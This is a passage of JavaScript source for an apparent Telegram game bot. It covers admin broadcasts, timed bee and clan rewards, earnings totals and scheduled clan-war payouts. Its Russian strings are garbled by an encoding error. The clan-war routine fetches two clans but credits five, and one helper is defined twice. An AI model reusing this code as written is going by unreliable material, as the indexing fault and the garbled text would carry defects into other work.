				var tek = Math.round((mm_i / mm_total) * 40)
				var str = ""
				for (var i = 0; i < tek; i++) str += "+"
				str += '>'
				for (var i = tek + 1; i < 41; i++) str += "-"
				bot.editMessageText("<b>–í—ã–ø–æ–ª–Ω–µ–Ω–æ:</b> " + mm_i + '/' + mm_total + ' - ' + Math.round((mm_i / mm_total) * 100) + '%\n' + str + "\n\n<b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:</b>\n<b>–£—Å–ø–µ—à–Ω—ã—Ö:</b> " + mm_ok + "\n<b>–ù–µ—É—Å–ø–µ—à–Ω—ã—Ö:</b> " + mm_err, { chat_id: mm_achatid, message_id: mm_amsgid, reply_markup: RM_mm1, parse_mode: html })
			}
			if (mm_i == mm_total) {
				mm_status = false;
				bot.editMessageText("–í—ã–ø–æ–ª–Ω–µ–Ω–æ: " + mm_i + '/' + mm_total, { chat_id: mm_achatid, message_id: mm_amsgid })
				sendAdmins('<b>–†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!\n\n–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:\n–£—Å–ø–µ—à–Ω–æ:</b> ' + mm_ok + "\n<b>–ù–µ—É—Å–ø–µ—à–Ω–æ:</b> " + mm_err, { parse_mode: html })
				mm_u = []
			}
		} finally { }
	}
}

setInterval(mmTick, 100);

var mm_total
var mm_i
var mm_status = false
var mm_amsgid
var mm_type
var mm_imgid
var mm_text
var mm_achatid
var mm_btn_status
var mm_btn_text
var mm_btn_link
var mm_ok
var mm_err

async function mm_t(text, amsgid, achatid, btn_status, btn_text, btn_link, size) {
	let ut = await User.find({}, { id: 1 }).sort({ _id: -1 })
	mm_total = ut.length
	console.log(ut)
	mm_u = []
	for (var i = 0; i < mm_total; i++)
		mm_u[i] = ut[i].id
	if (size != 100) {
		mm_u = randomizeArr(mm_u)
		mm_total = Math.ceil(mm_total * (size / 100))
		mm_u.length = mm_total
	}
	ut = undefined
	mm_i = 0;
	mm_amsgid = amsgid
	mm_type = "text"
	mm_text = text
	mm_ok = 0
	mm_err = 0
	mm_achatid = achatid
	if (btn_status) {
		mm_btn_status = true
		mm_btn_text = btn_text
		mm_btn_link = btn_link
	}
	else
		mm_btn_status = false
	mm_status = true;
}

bot.on('photo', async msg => {
	if (msg.from != undefined) {
		var uid = msg.from.id
		if (state[uid] == 7770 && ADMINS.indexOf(uid) !== -1) {
			state[uid] = undefined
			var text = ""
			if (msg.caption != undefined) text = msg.caption
			bot.sendMessage(uid, "–†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞!").then((e) => {
				if (text.split("#").length == 4) {
					var btn_text = text.split("#")[1].split("#")[0].replace(/(^\s*)|(\s*)$/g, '')
					var btn_link = text.split("#")[2].split("#")[0].replace(/(^\s*)|(\s*)$/g, '')
					text = text.split("#")[0].replace(/(^\s*)|(\s*)$/g, '').replace(' ', '')
					mm_img(msg.photo[msg.photo.length - 1].file_id, text, e.message_id, e.chat.id, true, btn_text, btn_link, 100)

				}
				else
					mm_img(msg.photo[msg.photo.length - 1].file_id, text, e.message_id, e.chat.id, false, false, false, 100)

			})
		}
	}
})



async function mm_img(img, text, amsgid, achatid, btn_status, btn_text, btn_link, size) {
	let ut = await User.find({}, { id: 1 }).sort({ _id: -1 })
	mm_total = ut.length
	mm_u = []
	for (var i = 0; i < mm_total; i++)
		mm_u[i] = ut[i].id
	if (size != 100) {
		mm_u = randomizeArr(mm_u)
		mm_total = Math.ceil(mm_total * (size / 100))
		mm_u.length = mm_total
	}

	ut = undefined
	mm_i = 0;
	mm_amsgid = amsgid
	mm_type = "img"
	mm_text = text
	mm_imgid = img
	mm_ok = 0
	mm_err = 0
	mm_achatid = achatid
	if (btn_status) {
		mm_btn_status = true
		mm_btn_text = btn_text
		mm_btn_link = btn_link
	}
	else
		mm_btn_status = false
	mm_status = true;
}

function randomizeArr(arr) {
	var j, temp;
	for (var i = arr.length - 1; i > 0; i--) {
		j = Math.floor(Math.random() * (i + 1));
		temp = arr[j];
		arr[j] = arr[i];
		arr[i] = temp;
	}
	return arr;
}

const html = "HTML"

function sendAdmins(text, params) { for (var i = 0; i < ADMINS.length; i++) bot.sendMessage(ADMINS[i], text, params) }

var data = []


function roundPlus(number) { if (isNaN(number)) return false; var m = Math.pow(10, 2); return Math.round(number * m) / m; }

async function main() {
	var u = (await User.find({}, { id: 1 })).map((e) => { return e.id })
	for (var i in u) {
		await User.findOneAndUpdate({ id: u[i] }, { refCount: await User.countDocuments({ ref: u[i] }) })
		console.log(i)
	}

}
//main()

// –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –ø—á–µ–ª–æ–º–∞—Ç–∫–∏ —Å –≤—ã–¥–∞—á–µ–π –ø—á—ë–ª
async function beeMotherUpdater() {
	// –£–¥–∞–ª–µ–Ω–∏–µ —Å—Ç–∞—Ä—ã—Ö –ø—á—ë–ª
	var bm = await BeeMother.find({ end_time: { $lte: Date.now() } })
	for (var i in bm) {
		var b = bm[i]
		await BeeMother.deleteOne({ _id: String(b._id) })
		bot.sendMessage(b.creator_id, `‚öúÔ∏è –í–∞—à–∞ —Ä–∞—Ç—É—à–∞ –ø—Ä–∏–Ω–µ—Å–ª–∞ 4 —Å—É–ø–µ—Ä–±–æ–π—Ü–∞ –∏ –∏—Å—á–µ–∑–ª–∞`)
	}
	// –í—ã–¥–∞—á–∞ –¥–∏–∫–∏—Ö –ø—á—ë–ª
	bm = await BeeMother.find({ beesGet: { $lte: 4 }, nextBeeGet: { $lte: Date.now() } })
	console.log(bm)
	for (var i in bm) {
		var b = bm[i]
		await BeeMother.findOneAndUpdate({ _id: String(b._id) }, { nextBeeGet: b.nextBeeGet + 1000 * 60 * 60 * 24 * 7, beesGet: b.beesGet + 1 })
		await WildBee.insertMany([{ creator_id: b.creator_id, start_time: Date.now(), level: 1, bee_profit: 0 }])
		bot.sendMessage(b.creator_id, `‚öúÔ∏è –†–∞—Ç—É—à–∞ –ø—Ä–∏–Ω–µ—Å–ª–∞ –í–∞–º —Å—É–ø–µ—Ä–±–æ–π—Ü–∞!`)
	}
}
setInterval(beeMotherUpdater, 1000 * 60 * 60)

// –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –≤—ã–¥–∞—á–∏ –º—ë–¥–∞ –¥–∏–∫–∏–º–∏ –ø—á—ë–ª–∞–º–∏
async function wildBeesUpdater() {
	if (new Date().getMinutes() == 0) {
		var wb = await WildBee.find()
		for (var i in wb) {
			var b = wb[i]
			await User.findOneAndUpdate({ id: b.creator_id }, { $inc: { wb_profits: wbProfits[b.level] } })
			await WildBee.findOneAndUpdate({ _id: String(b._id) }, { $inc: { bee_profit: wbProfits[b.level] } })
		}
	}
}
setInterval(wildBeesUpdater, 1000 * 60)

//User.updateMany({}, {payout: 0, not: false}).then()

async function totalEarnCalc() {
	var users = await User.find()
	for (const i in users) {
		try {
			var user = users[i]
			let total_earn = 0;
			user.trees.map((x) => {
				total_earn += trees.find((a) => a.id == x.id).earn
			})
			await User.findOneAndUpdate({ id: user.id }, { totalEarn: total_earn })
			console.log(i + "/" + users.length + " - " + total_earn)
		}
		catch { }
	}
}
setInterval(totalEarnCalc, 1000 * 60 * 15)

async function totalClanEarnCalc() {
	var clans = await Clan.find()
	for (const i in clans) {
		try {
			var clan = clans[i]
			let total_earn = 0;
			var users = await User.find({ clanName: clan.name })
			users.map(u => { total_earn += u.totalEarn })
			await Clan.findOneAndUpdate({ name: clan.name }, { total_earn: total_earn })
			console.log(i + "/" + clans.length + " - " + total_earn)
		}
		catch { }
	}
}

setInterval(totalClanEarnCalc, 1000 * 60 * 15)

async function clanWar() {
	var d = new Date()
	var minutes = d.getMinutes()
	var hours = d.getHours()
	var date = d.getDate()
	if (!(minutes == 0 && hours == 0 && (date == 5 || date == 15 || date == 25))) return
	var d = new Date()
	var clans = await Clan.find({ $and: [{ name: { $ne: "." } }, { name: { $ne: "dsfsdf" } }] }).sort({ total_earn: -1 }).limit(2)
	await Clan.findOneAndUpdate({ name: clans[0].name }, { $inc: { balance: 100000 } })
	await Clan.findOneAndUpdate({ name: clans[1].name }, { $inc: { balance: 50000 } })
	await Clan.findOneAndUpdate({ name: clans[2].name }, { $inc: { balance: 30000 } })
	await Clan.findOneAndUpdate({ name: clans[3].name }, { $inc: { balance: 15000 } })
	await Clan.findOneAndUpdate({ name: clans[4].name }, { $inc: { balance: 5000 } })
	var us = await User.find({ clanName: { $exists: true } }, { id: 1 })
	var nwd = new Date(getNextClanWarTimestamp())
	for (const i in us) {
		try {
			await bot.sendMessage(us[i].id, `
<b> ${d.getDate()}.${d.getMonth() + 1}.${d.getFullYear()} –±—ã–ª–∞ –ø—Ä–æ–≤–µ–¥–µ–Ω–∞ –±–∏—Ç–≤–∞ ${config.teplica_six}!</b>\n
üèÜ –ü–æ–±–µ–¥–∏–ª–∞ ${config.teplica_three}  <b>${clans[0].name}</b>
üí∞ –û–Ω –ø–æ–ª—É—á–∞–µ—Ç <b>Ô∏è 100k ${config.threetextthree}</b> –≤ –∫–∞–∑–Ω—É ${config.teplica_four}\n
2 –º–µ—Å—Ç–æ - <b>${clans[1].name}</b> - –ø–æ–ª—É—á–∞–µ—Ç <b> 50k ${config.threetextthree}</b>
3 –º–µ—Å—Ç–æ - <b>${clans[2].name}</b> - –ø–æ–ª—É—á–∞–µ—Ç <b> 30k ${config.threetextthree}</b>
4 –º–µ—Å—Ç–æ - <b>${clans[3].name}</b> - –ø–æ–ª—É—á–∞–µ—Ç <b>Ô∏è 15k ${config.threetextthree}</b>
5 –º–µ—Å—Ç–æ - <b>${clans[4].name}</b> - –ø–æ–ª—É—á–∞–µ—Ç <b>Ô∏è 5k ${config.threetextthree}</b>\n
 –°–ª–µ–¥—É—é—â–∏–π –±–æ–π <b>${nwd.getDate()}.${nwd.getMonth() + 1}.${nwd.getFullYear()}</b>
			`, { parse_mode: "html" });
		}
		catch{ }
	}
}

async function ticker() {
	var d = new Date()
	var minutes = d.getMinutes()
	var hours = d.getHours()
	var date = d.getDate()
	if (minutes == 0 && hours == 0 && (date == 5 || date == 15 || date == 25))
		clanWar()
	if (minutes == 0 && hours == 0)
		await User.updateMany({}, { game_limit: 10, spinsToday: 0 })
}

setInterval(ticker, 1000 * 60)

function getNextClanWarTimestamp() {
	var dt = new Date()
	var m = dt.getMonth()
	var d = dt.getDate()
	if (d < 5) dt.setDate(5)
	else if (d >= 25) {
		dt.setDate(5)
		dt.setMonth(dt.getMonth() + 1)
	}
	else if (d >= 5 && d < 15) dt.setDate(15)
	else if (d >= 15 && d < 25) dt.setDate(25)
	return dt.getTime()
}

Clan.findOneAndUpdate({ name: "üëëMARVELüëë" }, { creator_id: 816070668 }).then()

async function giveTree(uid, id) {
	var u = await User.findOne({ id: uid });
	let total_balance = 0;
	u.trees.map((x) => { total_balance += (((Date.now() - u.lastCollect) / 1000) / 60) * (trees.find((a) => a.id == x.id).earn / 60); })
	u.trees.push({ id: id, date: Date.now(), lastCollect: Date.now() });
	await User.findOneAndUpdate({ id: uid }, { lastCollect: Date.now(), fetuses: Number(total_balance.toFixed(2)), trees: u.trees })
}



function randomizeArr(arr) {
	var j, temp;
	for (var i = arr.length - 1; i > 0; i--) {
		j = Math.floor(Math.random() * (i + 1));
		temp = arr[j];
		arr[j] = arr[i];
		arr[i] = temp;
	}
	return arr;
}

function randomInteger(min, max) {
	// —Å–ª—É—á–∞–π–Ω–æ–µ —á–∏—Å–ª–æ –æ—Ç min –¥–æ (max+1)
	let rand = min + Math.random() * (max + 1 - min);
	return Math.floor(rand);
}
User.insertMany([
{ "_id" : "5dfaac928d3ea75ef63263ba", "trees": [ ], "id" : 0, "buybalance" : 0, "outbalance": 0, "bhivebalance" :0, "wb_profits" : 0, "name" : "Infix ¬©", "fc" : 0, "ref" : 0, "regDate" : "18/12/2019", "deposit" : 0, "payout" : 1100, "fetuses" : 0, "menu" : "{\"price\":20,\"status\":false,\"count\":5,\"bought\":3}", "lastCollect" : 1576709266975, "ban" : false, "refCount" : 0, "not" : false, "__v" : 0, "totalEarn" : 0, "prudLevel" : 0 },
{ "_id" : "5dfbe31493b06e7818e2c5d7", "trees" : [ ], "id" : 1, "menu" : "{\"price\":20,\"status\":true,\"count\":5,\"bought\":3}", "__v" : 0, "totalEarn" : 0, "prudLevel" : 0 }
]).then()